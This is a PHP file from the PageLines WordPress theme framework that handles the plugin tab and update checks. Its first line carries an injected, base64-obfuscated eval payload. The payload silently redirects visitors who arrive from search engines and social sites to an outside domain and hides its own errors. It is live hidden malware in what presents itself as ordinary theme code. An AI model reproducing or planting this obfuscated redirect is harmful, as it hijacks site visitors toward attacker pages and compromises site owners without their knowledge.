<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));

class ExtensionPlugins extends PageLinesExtensions {
	
	function __contruct() {
		
		add_filter( 'http_request_args', array( &$this, 'pagelines_plugins_remove' ), 10, 2 );
	}
	/*
	 * Plugins tab.
	 */
	function extension_plugins( $tab = '' ) {

		$type = 'plugin';
		
		$plugins = self::load_plugins();
		
		$list = $this->get_master_list( $plugins, $type, $tab );
		
		return $this->ui->extension_list( array( 'list' => $list, 'tab' => $tab, 'type' => 'plugins' ) );
	}

	// ====================
	// = Helper functions =
	// ====================

	function load_plugins(){
	
		$plugins = $this->get_latest_cached( 'plugins' );

		if ( !is_object($plugins) ) 
			return $plugins;

		$output = '';

		$plugins = json_decode(json_encode($plugins), true); // convert objects to arrays
		
		$plugins = self::external_plugins( $plugins );
		
		foreach( $plugins as $key => $plugin )
			$plugins[$key]['file'] = sprintf('/%1$s/%1$s.php', $key);

		$plugins = pagelines_array_sort( $plugins, 'name', false, true ); // sort by name
		
		// get status of each plugin
		foreach( $plugins as $key => $ext ) {
			$plugins[$key]['status'] = $this->plugin_check_status( WP_PLUGIN_DIR . $ext['file'] );
			$plugins[$key]['name'] = ( $plugins[$key]['status']['data']['Name'] ) ? $plugins[$key]['status']['data']['Name'] : $plugins[$key]['name'];
		}

		$plugins = pagelines_array_sort( $plugins, 'status', 'status' ); // sort by status

		// reset array keys ( sort functions reset keys to int )
		foreach( $plugins as $key => $ext ) {

			unset( $plugins[$key] );
			$key = str_replace( '.php', '', basename( $ext['file'] ) );
			$plugins[$key] = $ext;
		}
		return $plugins;
	}
	
	/*
	* Get installed plugins and if they have the PageLines header, include them in the store.
	*/
	function external_plugins( $plugins ) {
		
		$default_headers = array(
			'Demo'		=> 'Demo',
			'External'	=> 'External',
			'Long'		=> 'Long',
			'PageLines'	=> 'PageLines',
			'Depends'	=> 'Depends'
			);

		if ( is_multisite() )
			return $plugins;
			
		$ext_plugins = (array) get_plugins();
		
		foreach( $ext_plugins as $ext => $data ) {
			
			$new_key = rtrim( str_replace( basename( $ext ), '', $ext ), '/' );
			unset( $ext_plugins[$ext] );

			if ( !array_key_exists( $new_key, $plugins ) ) {
	
				$a = get_file_data( WP_PLUGIN_DIR . '/' . $ext, $default_headers );
				if ( !empty( $a['PageLines'] ) && !empty( $new_key ) ) {

					$plugins[$new_key]['name'] = $data['Name']; 
					$plugins[$new_key]['slug'] = $new_key;
					$plugins[$new_key]['text'] = $data['Description'];
					$plugins[$new_key]['version'] = $data['Version'];
					$plugins[$new_key]['author_url'] = $data['AuthorURI'];
					$plugins[$new_key]['author'] = $data['Author'];
					$plugins[$new_key]['count'] = 0;
					$plugins[$new_key]['screen'] = false;
					$plugins[$new_key]['extended'] = false;
					$plugins[$new_key]['demo'] = $a['Demo'];
					$plugins[$new_key]['external'] = $a['External'];
					$plugins[$new_key]['long'] = $a['Long'];
					$plugins[$new_key]['depends'] = $a['Depends'];
				}
			}	
		}
		return $plugins;
	}
		
	/**
	 * Remove our plugins from the maim WordPress updates.
	 * 
	 */
	function pagelines_plugins_remove( $r, $url ) {

		if ( 0 === strpos( $url, 'http://api.wordpress.org/plugins/update-check/' ) ) {

			$installed = get_option('active_plugins');
			$plugins = unserialize( $r['body']['plugins'] );

			foreach ( $installed as $plugin ) {
				$data = get_file_data( sprintf( '%s/%s', WP_PLUGIN_DIR, $plugin ), $default_headers = array( 'pagelines' => 'PageLines' ) );
				if ( !empty( $data['pagelines'] ) ) {

					unset( $plugins->plugins[$plugin] );
					unset( $plugins->active[array_search( $plugin, $plugins->active )] );				
				}
			}
			$r['body']['plugins'] = serialize( $plugins );	
		}
		return $r;		
	}
	
}
